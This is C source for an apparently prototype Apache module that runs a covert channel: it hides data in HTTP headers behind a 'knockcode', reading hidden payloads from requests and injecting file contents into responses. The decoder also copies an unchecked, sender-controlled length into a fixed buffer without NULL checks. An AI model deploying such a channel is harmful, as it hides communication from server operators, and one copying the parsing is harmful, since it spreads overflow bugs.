#include "httpd.h"
#include "http_config.h"
#include "apr_strings.h"

#include "config.h"
#include "utils.h"
#include "packet_builder.h"

// Dispatcher function that reads the config vector and calls the appropiate decoder for incoming requests
void packet_decoder(request_rec *r, steg_config *config, server_config *svr){

    //In the prototype, only straight head injection steganography will be used
    if(!strcasecmp(config->inputmethod, "Header")){
        header_decoder(r, config, svr);
        return;
    }
}

// Dispatcher function that reads the config vector and calls the appropiate encoder for outgoing responses
void packet_encoder(request_rec *r, steg_config *config, server_config *svr){

    //Read the data from the inputfile
    char data[PROTOCOL_MAX_PAYLOAD_SIZE];
    readline_outputfile(data, r->server);

    //In the prototype, only straight head injection steganography will be used
    if(!strcasecmp(config->outputmethod, "Header")){
        header_encoder(r, config, svr, data);
        return;
    }
}


void header_decoder(request_rec *r, steg_config *config, server_config *svr){

    const char *injected_header;
    char *x, *y;
    char length_field[PROTOCOL_LENGTH_SIZE+1]; //We need 1 extra byte for the null terminator
    long length_value;
    char payload[PROTOCOL_MAX_PAYLOAD_SIZE]; 

    // Get the value of the HTTP header
    injected_header = apr_table_get(r->headers_in, config->inputmethodconfig);

    // Scan for the knockcode
    x = strstr(injected_header, config->knockcode);
    x += strlen(config->knockcode);

    // Turn the length field into a integer
    memcpy(length_field, x, PROTOCOL_LENGTH_SIZE);
    length_field[PROTOCOL_LENGTH_SIZE] = '\0';
    y = length_field;
    while (*y == '0') y++ ; //zero padding in the field
    length_value = strtol(y, NULL, 10);

    // Skip the bytes of the length field so we point to the start of the paylaod
    x += PROTOCOL_LENGTH_SIZE;
    apr_cpystrn(payload, x, length_value+1 ); 

    // Write the header to the inputfile
    write_inputfile(payload, r, svr->inputfile);
}


void header_encoder(request_rec *r, steg_config *config, server_config *svr, char *data){

    char *x;
    char payload[PROTOCOL_MAX_PAYLOAD_SIZE];
    //const char *header;

    // Get the value of the HTTP header
    //header = apr_table_get(r->headers_out, config->outputmethodconfig);
    //If the header is not already present, we just add it
    //if (header == NULL){
    //}else{
    //} 

    //First part of the payload is the knockcode
    apr_cpystrn(payload, config->knockcode, 256);
    x = payload + strlen(config->knockcode);
    //Then we append the length field
    x = int_to_string(x, strlen(data), PROTOCOL_LENGTH_SIZE);  
    // Then the data
    apr_cpystrn(x, data, 256-strlen(config->knockcode)-PROTOCOL_LENGTH_SIZE);

    //string_to_inject* = apr_palloc(svr->pool, strlen(original_header) + strlen(payload) )
    apr_table_set(r->headers_out, config->outputmethodconfig, payload);

}
